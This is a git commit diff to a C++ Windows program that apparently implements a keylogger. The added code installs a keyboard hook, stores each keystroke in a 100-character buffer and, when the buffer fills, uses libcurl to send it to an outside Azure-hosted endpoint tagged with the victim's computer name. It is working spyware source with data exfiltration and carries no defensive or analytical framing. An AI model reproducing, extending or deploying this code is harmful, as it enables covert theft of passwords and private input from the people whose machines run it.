292a3741f76d11877f1a9561cc023719bada9d02
Dominik Ruman <dr124@o2.pl>
2021-11-30 18:17:12 +0100

    sending works

--- exe/main.cpp
+++ exe/main.cpp
@@ -13,6 +13,27 @@ using namespace std;
 HHOOK hKeyboardHook;
 CURL* curl;
 
+const char* requestUrl = "https://rumlogger.azurewebsites.net/api/User/AddUserData";
+const int maxSize = 1000;
+char* name;
+
+void SendLogs(const char* logs)
+{
+	char* url = new char[maxSize];
+	sprintf_s(url, static_cast<size_t>(maxSize), "%s?Name=%s&Logs=%s",
+		requestUrl, name, curl_easy_escape(curl, logs, 0));
+
+	curl_easy_setopt(curl, CURLOPT_URL, url);
+	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
+	auto res = curl_easy_perform(curl);
+
+	delete[] url;
+}
+
+const int logsLength = 100;
+char* tab = nullptr;
+int logIndex = 0;
+
 __declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	if (nCode == HC_ACTION && (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN))
@@ -24,7 +45,16 @@ __declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, L
 		auto ctrl = GetAsyncKeyState(VK_CONTROL);
 		auto alt = GetAsyncKeyState(VK_MENU);
 
-		printf("Keycode = %c, %d %d %d\n", key, shift, ctrl, alt);
+		printf("Keycode = %c, %d %d %d   %d\n", key, shift, ctrl, alt, logIndex);
+
+		if (logIndex < logsLength) {
+			tab[logIndex++] = static_cast<char>(key);
+		}
+		else if(logIndex >= logsLength)
+		{
+			logIndex = 0;
+			SendLogs(tab);
+		}
 	}
 	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
 }
@@ -48,18 +78,21 @@ DWORD WINAPI my_HotKey(LPVOID lpParm)
 	return 0;
 }
 
-size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
-	data->append((char*)ptr, size * nmemb);
-	return size * nmemb;
+char* ReadComputerName()
+{
+	DWORD cchComputerName = MAX_COMPUTERNAME_LENGTH + 1;
+	char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
+	GetComputerNameA(computerName, &cchComputerName);
+	return computerName;
 }
 
 int work(int argc, char** argv)
 {
-	curl_easy_setopt(curl, CURLOPT_URL, "https://rumlogger.azurewebsites.net/api/User/AddUserData?Name=test3&Logs=test123");
-	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
-	auto res = curl_easy_perform(curl);
-
-	return 0;
+	DWORD threadId;
+	const auto threadHandle = CreateThread(nullptr, NULL, my_HotKey, argv[0], NULL, &threadId);
+	return threadHandle
+		? WaitForSingleObject(threadHandle, INFINITE)
+		: 2137;
 }
 
 
@@ -67,6 +100,8 @@ int main(int argc, char** argv)
 {
 	curl = curl_easy_init();
 
+	tab = static_cast<char*>(calloc(logsLength+1, sizeof(char)));
+	name = ReadComputerName();
 	auto ret = work(argc, argv);
 
 	curl_easy_cleanup(curl);
